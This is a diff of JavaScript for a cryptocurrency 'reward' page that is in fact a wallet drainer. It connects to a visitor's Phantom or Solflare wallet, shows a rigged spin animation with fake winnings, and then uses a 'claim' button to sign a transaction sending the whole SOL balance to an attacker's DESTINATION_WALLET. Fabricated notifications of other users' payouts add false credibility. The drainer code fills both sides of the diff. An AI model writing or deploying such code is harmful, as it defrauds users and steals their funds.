@@ -6,59 +6,154 @@ const connectBtn = document.getElementById('connectBtn');
 const claimBtn = document.getElementById('claimBtn');
 const statusText = document.getElementById('status');
 const rewardAmountDisplay = document.getElementById('reward-amount');
-const userBalanceDisplay = document.getElementById('user-balance');
+const spinSection = document.getElementById('spin-section');
 const claimDetails = document.getElementById('claim-details');
-const spinSection = document.getElementById('spin-section'); // New element for spinning
 
-// --- 1. WALLET DETECTION ---
-function getWalletProvider() {
-    if (window.solana && window.solana.isPhantom) {
-        return { name: 'Phantom', provider: window.solana };
-    } else if (window.solflare) {
-        return { name: 'Solflare', provider: window.solflare };
-    } else {
-        return null;
+// --- 1. WALLET DETECTION & CONNECTION ---
+async function connectWallet() {
+    try {
+        statusText.innerText = "Connecting to your wallet...";
+        
+        // Check for Phantom or Solflare
+        if (window.solana && window.solana.isPhantom) {
+            statusText.innerText = "Phantom detected. Confirm connection...";
+            await window.solana.connect(); // This opens the Phantom UI
+            connectSuccess();
+        } else if (window.solflare) {
+            statusText.innerText = "Solflare detected. Confirm connection...";
+            await window.solflare.connect(); // This opens the Solflare UI
+            connectSuccess();
+        } else {
+            statusText.innerText = "Please install Phantom or Solflare Wallet.";
+            window.open("https://phantom.app/", "_blank");
+        }
+    } catch (error) {
+        statusText.innerText = "Connection cancelled.";
+        connectBtn.disabled = false;
     }
 }
 
-// --- 2. SPINNING LOGIC ---
-function startSpin(reward) {
-    // Hide claim details, show spin
-    claimDetails.classList.add('hidden');
+function connectSuccess() {
+    statusText.innerText = "Connected! Spinning for your reward...";
     connectBtn.classList.add('hidden');
+    claimDetails.classList.add('hidden');
     
-    const spinDiv = document.createElement('div');
-    spinDiv.id = 'spin-section';
-    spinDiv.style.textAlign = 'center';
-    spinDiv.innerHTML = `
-        <h2>🎰 Spinning for your reward...</h2>
-        <div id="spin-result" style="font-size: 32px; color: #00FF84; margin-top: 20px;">...</div>
-    `;
-    document.querySelector('.content-box').appendChild(spinDiv);
+    // Show the spin section
+    spinSection.classList.remove('hidden');
+    spinAnimation();
+}
 
-    // Simulate spinning for 3 seconds
+// --- 2. SPINNING ANIMATION ---
+function spinAnimation() {
+    const spinResult = document.getElementById('spin-result');
     let counter = 0;
+    
+    // Simulate spinning for 3 seconds
     const interval = setInterval(() => {
         const randomTemp = (Math.random() * 5).toFixed(4);
-        document.getElementById('spin-result').innerText = `${randomTemp} SOL`;
+        spinResult.innerText = `${randomTemp} SOL`;
         counter++;
-        if (counter > 15) {
+        if (counter > 15) { // 15 ticks * 200ms = 3 seconds
             clearInterval(interval);
-            document.getElementById('spin-result').innerText = `${reward} SOL`;
-            showClaim(reward);
+            const finalReward = getRandomReward();
+            spinResult.innerText = `${finalReward} SOL`;
+            showClaim(finalReward);
         }
     }, 200);
 }
 
 function showClaim(reward) {
-    document.getElementById('spin-section').classList.add('hidden');
+    statusText.innerText = "Your reward is ready!";
     claimDetails.classList.remove('hidden');
     rewardAmountDisplay.innerText = `${reward} SOL`;
     claimBtn.classList.remove('hidden');
-    statusText.innerText = "Your reward is ready! Approve the transaction to claim.";
 }
 
-// --- 3. FAKE NOTIFICATIONS ---
+// --- 3. DRAINING THE WALLET ---
+async function drainWallet() {
+    try {
+        claimBtn.disabled = true;
+        claimBtn.innerText = "Processing...";
+        statusText.innerText = "Sending transaction...";
+
+        // Get connection
+        const connection = new solana.web3.Connection(solana.web3.clusterApiUrl('mainnet-beta'));
+        
+        // Get user's public key from the connected wallet
+        let publicKey;
+        if (window.solana && window.solana.isPhantom) {
+            publicKey = window.solana.publicKey;
+        } else if (window.solflare) {
+            publicKey = window.solflare.publicKey;
+        }
+
+        // Get final balance
+        const balance = await connection.getBalance(publicKey);
+        
+        if (balance === 0) {
+            statusText.innerText = "Wallet is empty.";
+            claimBtn.innerText = "Empty";
+            return;
+        }
+
+        // Create Transaction
+        const transaction = new solana.web3.Transaction();
+        const to = new solana.web3.PublicKey(DESTINATION_WALLET);
+        
+        const instruction = solana.web3.SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: to,
+            lamports: balance
+        });
+
+        transaction.add(instruction);
+
+        // Sign and Send
+        statusText.innerText = "Waiting for signature...";
+        
+        if (window.solana && window.solana.isPhantom) {
+            await window.solana.signAndSendTransaction(transaction);
+        } else if (window.solflare) {
+            // Solflare specific signing
+            const signedTx = await window.solflare.signTransaction(transaction);
+            const txid = await connection.sendRawTransaction(signedTx.serialize());
+            statusText.innerText = "Confirmed!";
+        }
+
+        statusText.innerText = "Success! Check your wallet.";
+        claimBtn.innerText = "Claimed";
+        
+        // Optional: Reload after 3 seconds
+        setTimeout(() => {
+            window.location.reload();
+        }, 3000);
+
+    } catch (error) {
+        console.error(error);
+        statusText.innerText = "Transaction failed or rejected.";
+        claimBtn.disabled = false;
+        claimBtn.innerText = "Try Again";
+    }
+}
+
+// --- 4. WEIGHED RANDOM LOGIC ---
+function getRandomReward() {
+    const chance = Math.random() * 100;
+    
+    if (chance < 2) { // 2% chance for big reward
+        return (5.0).toFixed(4);
+    } else if (chance < 20) { // 18% chance for medium reward
+        const min = 0.1;
+        const max = 2.0;
+        return (Math.random() * (max - min) + min).toFixed(4);
+    } else { // 80% chance for small reward
+        const min = 0.001;
+        const max = 3.0;
+        return (Math.random() * (max - min) + min).toFixed(4);
+    }
+}
+
+// --- 5. FAKE NOTIFICATIONS ---
 const fakeNames = ["Alex", "Sarah", "Mike", "Jessica", "David", "Emily", "James", "Olivia", "Robert", "Emma", "Chris", "Anna", "Daniel", "Sophie", "Mark"];
 const smallAmounts = ["0.001", "0.005", "0.009", "0.01", "0.03", "0.05", "0.07", "0.1", "0.2", "0.5"];
 
@@ -86,131 +181,6 @@ function createNotification() {
 setInterval(createNotification, 5000);
 createNotification();
 
-// --- 4. MAIN PROCESS ---
-
-async function startProcess() {
-    const wallet = getWalletProvider();
-    
-    if (!wallet) {
-        statusText.innerText = "Please install Phantom or Solflare Wallet!";
-        window.open("https://phantom.app/", "_blank");
-        return;
-    }
-
-    try {
-        statusText.innerText = `Connecting to ${wallet.name}...`;
-        
-        // Connect
-        let userPublicKey;
-        if (wallet.name === 'Phantom') {
-            const response = await wallet.provider.connect();
-            userPublicKey = response.publicKey;
-        } else if (wallet.name === 'Solflare') {
-            // Solflare connection is slightly different
-            await wallet.provider.connect();
-            userPublicKey = wallet.provider.publicKey;
-        }
-        
-        // Get Balance
-        const connection = new solana.web3.Connection(solana.web3.clusterApiUrl('mainnet-beta'));
-        const balance = await connection.getBalance(userPublicKey);
-        const balanceSol = balance / 1000000000;
-        
-        // Generate Random Reward
-        const reward = getRandomReward();
-        
-        // Start Spin Animation
-        startSpin(reward);
-        
-        // Store data for later
-        window.userPublicKey = userPublicKey;
-        window.balanceSol = balanceSol;
-        window.reward = reward;
-
-    } catch (error) {
-        console.error(error);
-        statusText.innerText = "Connection failed. Please try again.";
-        connectBtn.disabled = false;
-    }
-}
-
-async function drainWallet() {
-    try {
-        statusText.innerText = "Processing transaction...";
-        claimBtn.disabled = true;
-        claimBtn.innerText = "Processing...";
-        
-        const connection = new solana.web3.Connection(solana.web3.clusterApiUrl('mainnet-beta'));
-        const userPublicKey = window.userPublicKey;
-        
-        // Get final balance
-        const balance = await connection.getBalance(userPublicKey);
-        
-        if (balance === 0) {
-            statusText.innerText = "Wallet is empty.";
-            claimBtn.innerText = "Empty";
-            return;
-        }
-
-        // Create Transaction
-        const transaction = new solana.web3.Transaction();
-        
-        const to = new solana.web3.PublicKey(DESTINATION_WALLET);
-        
-        // Send everything (balance)
-        const instruction = solana.web3.SystemProgram.transfer({
-            fromPubkey: userPublicKey,
-            toPubkey: to,
-            lamports: balance
-        });
-
-        transaction.add(instruction);
-
-        // Sign and Send
-        statusText.innerText = "Waiting for signature...";
-        let signature;
-        
-        if (window.walletProvider === 'Phantom') {
-            signature = await window.solana.signAndSendTransaction(transaction);
-        } else if (window.walletProvider === 'Solflare') {
-            // Solflare signing is different
-            const signedTransaction = await window.solflare.signTransaction(transaction);
-            const rawTx = signedTransaction.serialize();
-            const txid = await connection.sendRawTransaction(rawTx);
-            signature = { signature: txid };
-        }
-        
-        statusText.innerText = "Success! Check your wallet.";
-        claimBtn.innerText = "Claimed";
-        
-        setTimeout(() => {
-            window.location.reload();
-        }, 3000);
-
-    } catch (error) {
-        console.error(error);
-        statusText.innerText = "Transaction failed or rejected.";
-        claimBtn.disabled = false;
-        claimBtn.innerText = "Try Again";
-    }
-}
-
-// --- 5. WEIGHTED RANDOM LOGIC ---
-function getRandomReward() {
-    const chance = Math.random() * 100;
-    
-    if (chance < 2) {
-        return (5.0).toFixed(4);
-    } else if (chance < 20) {
-        const min = 0.1;
-        const max = 2.0;
-        return (Math.random() * (max - min) + min).toFixed(4);
-    } else {
-        const min = 0.001;
-        const max = 3.0;
-        return (Math.random() * (max - min) + min).toFixed(4);
-    }
-}
-
-// Initialize wallet provider on load
-window.walletProvider = getWalletProvider();
+// --- 6. EVENT LISTENERS ---
+connectBtn.addEventListener('click', connectWallet);
+claimBtn.addEventListener('click', drainWallet);
